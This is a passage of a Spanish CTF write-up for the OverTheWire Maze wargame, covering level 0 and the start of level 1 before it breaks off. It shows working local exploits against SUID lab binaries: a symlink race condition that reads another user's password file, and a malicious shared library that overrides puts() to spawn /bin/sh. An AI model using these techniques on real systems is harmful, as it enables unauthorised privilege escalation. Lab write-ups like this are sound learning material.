<!doctype html><html lang=es><head><title>Maze | 7Rocky</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Este laboratorio sirve para practicar técnicas de explotación, programación e ingeniería inversa. El laboratorio consta de 9 niveles, en una arquitectura Linux/x86 (todas las protecciones están deshabilitadas: NX, PIE, canarios e incluso ASLR).
Para conectarse al primer nivel, se nos proporcionan las credenciales de SSH para el usuario maze0.
Realizando un reconocimiento inicial, la máquina nos muestra que hay binarios SUID que deben ser explotados para pasar al siguiente nivel. Además, tenemos algunos archivos que contienen las contraseñas de los usuarios mazeX:"><meta name=robots content="index, follow"><meta name=image content="https://7rocky.github.io/images/pwn.png"><meta name=author content="7Rocky"><meta property="og:title" content="Maze"><meta property="og:description" content="Este laboratorio sirve para practicar técnicas de explotación, programación e ingeniería inversa. El laboratorio consta de 9 niveles, en una arquitectura Linux/x86 (todas las protecciones están deshabilitadas: NX, PIE, canarios e incluso ASLR).
Para conectarse al primer nivel, se nos proporcionan las credenciales de SSH para el usuario maze0.
Realizando un reconocimiento inicial, la máquina nos muestra que hay binarios SUID que deben ser explotados para pasar al siguiente nivel. Además, tenemos algunos archivos que contienen las contraseñas de los usuarios mazeX:"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/ctf/overthewire/maze/"><meta property="article:section" content="ctf"><meta property="article:modified_time" content="2022-03-24T17:20:13+01:00"><meta property="og:site_name" content="7Rocky"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:author" content="7Rocky"><meta itemprop=name content="Maze"><meta itemprop=description content="Este laboratorio sirve para practicar técnicas de explotación, programación e ingeniería inversa. El laboratorio consta de 9 niveles, en una arquitectura Linux/x86 (todas las protecciones están deshabilitadas: NX, PIE, canarios e incluso ASLR).
Para conectarse al primer nivel, se nos proporcionan las credenciales de SSH para el usuario maze0.
Realizando un reconocimiento inicial, la máquina nos muestra que hay binarios SUID que deben ser explotados para pasar al siguiente nivel. Además, tenemos algunos archivos que contienen las contraseñas de los usuarios mazeX:"><meta itemprop=dateModified content="2022-03-24T17:20:13+01:00"><meta itemprop=wordCount content="10416"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="Maze"><meta name=twitter:description content="Este laboratorio sirve para practicar técnicas de explotación, programación e ingeniería inversa. El laboratorio consta de 9 niveles, en una arquitectura Linux/x86 (todas las protecciones están deshabilitadas: NX, PIE, canarios e incluso ASLR).
Para conectarse al primer nivel, se nos proporcionan las credenciales de SSH para el usuario maze0.
Realizando un reconocimiento inicial, la máquina nos muestra que hay binarios SUID que deben ser explotados para pasar al siguiente nivel. Además, tenemos algunos archivos que contienen las contraseñas de los usuarios mazeX:"><meta name=twitter:image content="https://7rocky.github.io/images/pwn.png"><meta name=twitter:author content="7Rocky"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon><link href=/css/style.css rel=stylesheet><link href=/css/monokai-sublime.min.css rel=stylesheet><link href=/css/code.css rel=stylesheet><link href=/css/main.css rel=stylesheet><script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script><script src=/js/main.js></script><div style=display:none>$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$</div></head><body class="ma0 production"><header style=position:sticky;top:0;z-index:9><div class=bg-black><nav class=ph4-ns role=navigation><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href title=es><img alt=es height=30px src=/images/es.png width=30px></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href=/en/ctf/overthewire/maze/ title=en><img alt=en height=30px src=/images/en.png style="border:4px solid#000;border-radius:100%" width=30px></a><ul class="pl0 ml3 mr3"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a></li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class=pb7 role=main><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label=aside class="instapaper_ignoref b helvetica tracked">OVERTHEWIRE</aside><div id=sharing class=mt3><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/overthewire/maze/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/overthewire/maze/&text=Maze" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/ctf/overthewire/maze/&title=Maze" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Maze</h1><br></header><aside aria-label=aside class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents><ul><li><a href=#nivel-0---1>Nivel 0 -> 1</a></li><li><a href=#nivel-1---2>Nivel 1 -> 2</a></li><li><a href=#nivel-2---3>Nivel 2 -> 3</a></li><li><a href=#nivel-3---4>Nivel 3 -> 4</a></li><li><a href=#nivel-4---5>Nivel 4 -> 5</a></li><li><a href=#nivel-5---6>Nivel 5 -> 6</a></li><li><a href=#nivel-6---7>Nivel 6 -> 7</a></li><li><a href=#nivel-7---8>Nivel 7 -> 8</a></li><li><a href=#nivel-8---9>Nivel 8 -> 9</a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Este laboratorio sirve para practicar técnicas de explotación, programación e ingeniería inversa. El laboratorio consta de 9 niveles, en una arquitectura Linux/x86 (todas las protecciones están deshabilitadas: NX, PIE, canarios e incluso ASLR).</p><p>Para conectarse al primer nivel, se nos proporcionan las credenciales de SSH para el usuario <code>maze0</code>.</p><p>Realizando un reconocimiento inicial, la máquina nos muestra que hay binarios SUID que deben ser explotados para pasar al siguiente nivel. Además, tenemos algunos archivos que contienen las contraseñas de los usuarios <code>mazeX</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze0@maze</span>:<span class=code-blue>~</span>$ ls -lh /maze
total 88K
-r-sr-x--- 1 maze1 maze0 8.1K Aug 26  2019 <span class="code-white code-bg-red">maze0</span>  
-r-sr-x--- 1 maze2 maze1 7.2K Aug 26  2019 <span class="code-white code-bg-red">maze1</span>
-r-sr-x--- 1 maze3 maze2 7.3K Aug 26  2019 <span class="code-white code-bg-red">maze2</span>
-r-sr-x--- 1 maze4 maze3  732 Aug 26  2019 <span class="code-white code-bg-red">maze3</span>
-r-sr-x--- 1 maze5 maze4  10K Aug 26  2019 <span class="code-white code-bg-red">maze4</span>
-r-sr-x--- 1 maze6 maze5 9.2K Aug 26  2019 <span class="code-white code-bg-red">maze5</span>
-r-sr-x--- 1 maze7 maze6 8.0K Aug 26  2019 <span class="code-white code-bg-red">maze6</span>
-r-sr-x--- 1 maze8 maze7 9.7K Aug 26  2019 <span class="code-white code-bg-red">maze7</span>
-r-sr-x--- 1 maze9 maze8  12K Aug 26  2019 <span class="code-white code-bg-red">maze8</span>
<span class=code-green>maze0@maze</span>:<span class=code-blue>~</span>$ ls -lh /etc/maze_pass
total 40
-r-------- 1 maze0 maze0  6 Aug 26  2019 maze0
-r-------- 1 maze1 maze1 11 Aug 26  2019 maze1
-r-------- 1 maze2 maze2 11 Aug 26  2019 maze2
-r-------- 1 maze3 maze3 11 Aug 26  2019 maze3
-r-------- 1 maze4 maze4 11 Aug 26  2019 maze4
-r-------- 1 maze5 maze5 11 Aug 26  2019 maze5
-r-------- 1 maze6 maze6 11 Aug 26  2019 maze6
-r-------- 1 maze7 maze7 11 Aug 26  2019 maze7
-r-------- 1 maze8 maze8 11 Aug 26  2019 maze8
-r-------- 1 maze9 maze9 11 Aug 26  2019 maze9
</code></pre></div><p>Los permisos de los archivos están debidamente configurados para que todo funcione en cada nivel.</p><h2 id=nivel-0---1>Nivel 0 -> 1</h2><p>Nos podemos transferir <code>/maze/maze0</code> a nuestra máquina copiando el archivo codificado en Base64. Luego lo podemos abrir con Ghidra para obtener el código en C descompilado:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">argc</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span> <span class=mtk5>**</span><span class="mtk9 mtki">argv</span><span class=mtk1>)</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>iVar1;</span>
  <span class="mtk7 mtki">__uid_t</span> <span class=mtk1>__suid;</span>
  <span class="mtk7 mtki">__uid_t</span> <span class=mtk1>__euid;</span>
  <span class="mtk7 mtki">__uid_t</span> <span class=mtk1>__ruid;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>buf[</span><span class=mtk6>20</span><span class=mtk1>];</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>fd;</span>

  <span class=mtk8>memset</span><span class=mtk1>(buf,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>14</span><span class=mtk1>);</span>
  <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>access</span><span class=mtk1>(</span><span class=mtk4>"/tmp/128ecf542a35ac5270a87dc740918404"</span><span class=mtk1>,</span> <span class=mtk6>4</span><span class=mtk1>);</span>  
  <span class=mtk5>if</span> <span class=mtk1>(iVar1</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk1>__suid</span> <span class=mtk5>=</span> <span class=mtk8>geteuid</span><span class=mtk1>();</span>
    <span class=mtk1>__euid</span> <span class=mtk5>=</span> <span class=mtk8>geteuid</span><span class=mtk1>();</span>
    <span class=mtk1>__ruid</span> <span class=mtk5>=</span> <span class=mtk8>geteuid</span><span class=mtk1>();</span>
    <span class=mtk8>setresuid</span><span class=mtk1>(__ruid,</span> <span class=mtk1>__euid,</span> <span class=mtk1>__suid);</span>
    <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>open</span><span class=mtk1>(</span><span class=mtk4>"/tmp/128ecf542a35ac5270a87dc740918404"</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
    <span class=mtk5>if</span> <span class=mtk1>(iVar1</span> <span class=mtk5>&lt;</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
      <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
    <span class=mtk1>}</span>
    <span class=mtk8>read</span><span class=mtk1>(iVar1,</span> <span class=mtk1>buf,</span> <span class=mtk5>0x</span><span class=mtk6>13</span><span class=mtk1>);</span>
    <span class=mtk8>write</span><span class=mtk1>(</span><span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk1>buf,</span> <span class=mtk5>0x</span><span class=mtk6>13</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
<span class=mtk1>}</span>
</code></pre></div><p>Vemos que está accediendo a un archivo en <code>/tmp/128ecf542a35ac5270a87dc740918404</code>. Si el acceso es correcto, lee su contenido y lo imprime por la salida estándar (<code>stdout</code>).</p><p>Veamos qué permisos tenemos en <code>/tmp</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze0@maze</span>:<span class=code-blue>~</span>$ ls -l --time-style=+ /
total 148
drwxr-xr-x    2 root root  4096  <span class=code-blue>bin</span>
drwxr-xr-x    4 root root  4096  <span class=code-blue>boot</span>
dr-xr-xr-x    3 root root     0  <span class=code-blue>cgroup2</span>
drwxr-xr-x   14 root root  4020  <span class=code-blue>dev</span>
drwxr-xr-x   88 root root  4096  <span class=code-blue>etc</span>
drwxr-xr-x   12 root root  4096  <span class=code-blue>home</span>
lrwxrwxrwx    1 root root    29  <span class=code-cyan>initrd.img</span> -> boot/initrd.img-4.9.0-6-amd64
lrwxrwxrwx    1 root root    29  <span class=code-cyan>initrd.img.old</span> -> boot/initrd.img-4.9.0-6-amd64  
drwxr-xr-x   16 root root  4096  <span class=code-blue>lib</span>
drwxr-xr-x    2 root root  4096  <span class=code-blue>lib32</span>
drwxr-xr-x    2 root root  4096  <span class=code-blue>lib64</span>
drwxr-xr-x    2 root root  4096  <span class=code-blue>libx32</span>
drwx------    2 root root 16384  <span class=code-blue>lost+found</span>
drwxr-xr-x    2 root root  4096  <span class=code-blue>maze</span>
drwxr-xr-x    3 root root  4096  <span class=code-blue>media</span>
drwxr-xr-x    2 root root  4096  <span class=code-blue>mnt</span>
drwxr-xr-x    2 root root  4096  <span class=code-blue>opt</span>
dr-xr-xr-x  106 root root     0  <span class=code-blue>proc</span>
lrwxrwxrwx    1 root root     9  <span class=code-cyan>README.txt</span> -> /etc/motd
drwx------    8 root root  4096  <span class=code-blue>root</span>
drwxr-xr-x   15 root root   580  <span class=code-blue>run</span>
drwxr-xr-x    2 root root  4096  <span class=code-blue>sbin</span>
drwxr-xr-x    3 root root  4096  <span class=code-blue>share</span>
drwxr-xr-x    2 root root  4096  <span class=code-blue>srv</span>
dr-xr-xr-x   12 root root     0  <span class=code-blue>sys</span>
drwxrws-wt 1243 root root 57344  <span class="code-blue code-bg-green">tmp</span>
drwxr-xr-x   12 root root  4096  <span class=code-blue>usr</span>
drwxr-xr-x   11 root root  4096  <span class=code-blue>var</span>
lrwxrwxrwx    1 root root    26  <span class=code-cyan>vmlinuz</span> -> boot/vmlinuz-4.9.0-6-amd64
lrwxrwxrwx    1 root root    26  <span class=code-cyan>vmlinuz.old</span> -> boot/vmlinuz-4.9.0-6-amd64
</code></pre></div><p>No podemos listar el contenido de <code>/tmp</code>, pero sí podemos escribir. Entonces, creamos un archivo llamado <code>/tmp/128ecf542a35ac5270a87dc740918404</code> y volvemos a ejecutar el binario:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze0@maze</span>:<span class=code-blue>~</span>$ echo ASDF > /tmp/128ecf542a35ac5270a87dc740918404  
<span class=code-green>maze0@maze</span>:<span class=code-blue>~</span>$ /maze/maze0
ASDF
</code></pre></div><p>La idea es crear un enlace simbólico de manera que <code>/tmp/128ecf542a35ac5270a87dc740918404</code> apunte a <code>/etc/maze_pass/maze1</code> y leerlo utilizando el binario:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze0@maze</span>:<span class=code-blue>~</span>$ ln -s /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404
<span class=code-green>maze0@maze</span>:<span class=code-blue>~</span>$ ls -l --time-style=+ /tmp/128ecf542a35ac5270a87dc740918404
lrwxrwxrwx 1 maze0 root 20  <span class=code-cyan>/tmp/128ecf542a35ac5270a87dc740918404</span> -> /etc/maze_pass/maze1  
<span class=code-green>maze0@maze</span>:<span class=code-blue>~</span>$ /maze/maze0
</code></pre></div><p>Mediante <code>ltrace</code>, vemos que <code>access</code> está devolviendo <code>-1</code>, por lo que el archivo no se está leyendo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze0@maze</span>:<span class=code-blue>~</span>$ ltrace /maze/maze0
__libc_start_main(0x804854b, 1, 0xffffd7a4, 0x80485e0 &lt;unfinished ...&gt;
memset(0xffffd6e8, '\0', 20)                                                                     = 0xffffd6e8  
access("/tmp/128ecf542a35ac5270a87dc7409"..., 4)                                                 = -1
+++ exited (status 0) +++
</code></pre></div><p>Aunque no somos capaces de pasar de la función <code>access</code> en circunstancias normales, existe una condición de carrera (<em>race condition</em>). La idea es pasar de la función <code>access</code> vinculando <code>/tmp/128ecf542a35ac5270a87dc740918404</code> a un archivo al cual tengamos permisos de lectura (por ejemplo, <code>/etc/maze_pass/maze0</code>) y justo después vincularlo a <code>/etc/maze_pass/maze1</code>, de manera que haya una situación en la que podamos abrir el segundo archivo y leerlo.</p><p>Por tanto, necesitamos este bucle en una sesión:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze0@maze</span>:<span class=code-blue>~</span>$ while true; do ln -sf /etc/maze_pass/maze0 /tmp/128ecf542a35ac5270a87dc740918404; ln -sf /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404; done  
</code></pre></div><p>Y este otro bucle en otra sesión:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze0@maze</span>:<span class=code-blue>~</span>$ while true; do /maze/maze0; done  
</code></pre></div><p>Después de algunos segundos, veremos la contraseña:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze0@maze</span>:<span class=code-blue>~</span>$ while true; do /maze/maze0; done
-bash: fork: retry: Resource temporarily unavailable  
...
-bash: fork: retry: Resource temporarily unavailable
hashaachon
-bash: fork: retry: Resource temporarily unavailable
^C-bash: fork: Interrupted system call
</code></pre></div><h2 id=nivel-1---2>Nivel 1 -> 2</h2><p>Si cogemos <code>/maze/maze1</code> y lo abrimos en Ghidra, vemos esta función <code>main</code> de &ldquo;Hola mundo&rdquo;:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>()</span> <span class=mtk1>{</span>
  <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Hello</span> <span class=mtk4>World!</span><span class=mtk6>\n</span><span class=mtk4>"</span><span class=mtk1>);</span>  
  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
<span class=mtk1>}</span>
</code></pre></div><p>Sin embargo, hay un problema si lo ejecutamos. El binario está buscando una librería llamada <code>libc.so.4</code> en el directorio actual:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze1@maze</span>:<span class=code-blue>~</span>$ /maze/maze1
/maze/maze1: error while loading shared libraries: ./libc.so.4: cannot open shared object file: No such file or directory  

<span class=code-green>maze1@maze</span>:<span class=code-blue>~</span>$ ldd /maze/maze1
  linux-gate.so.1 (0xf7fd7000)
  ./libc.so.4 => not found
  libc.so.6 => /lib32/libc.so.6 (0xf7e12000)
  /lib/ld-linux.so.2 (0xf7fd9000)
</code></pre></div><p>Por tanto, para ejecutar el binario, necesitamos poner una librería válida en el directorio actual. Por ejemplo, podemos decirle al binario que <code>puts</code> tiene la siguiente funcionalidad:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>#include</span> <span class=mtk4>&lt;stdlib.h&gt;</span>  

<span class="mtk7 mtki">int</span> <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk5>const</span> <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class="mtk9 mtki">s</span><span class=mtk1>)</span> <span class=mtk1>{</span>
  <span class=mtk8>system</span><span class=mtk1>(</span><span class=mtk4>"/bin/sh"</span><span class=mtk1>);</span>
  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
<span class=mtk1>}</span>
</code></pre></div><p>Como resultado, al ejecutar el binario, tendremos una <em>shell</em> como <code>maze2</code> (porque el binario es SUID y pertenece al usuario <code>maze2</code>).</p><p>Vamos a escribir el código y compilarlo en <code>/tmp</code>, porque tenemos permisos de escritura:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>maze1@maze</span>:<span class=code-blue>~</span>$ cd /tmp
<span class=code-green>maze1@maze</span>:<span class=code-blue>/tmp</span>$ vim lib.c  
<span class=code-green>maze1@maze</span>:<span class=code-blue>/tmp</span>$ cat lib.c
#include &lt;stdlib.h&gt;

int puts(const char *s) {
  system("/bin/sh");
  return 0;
}
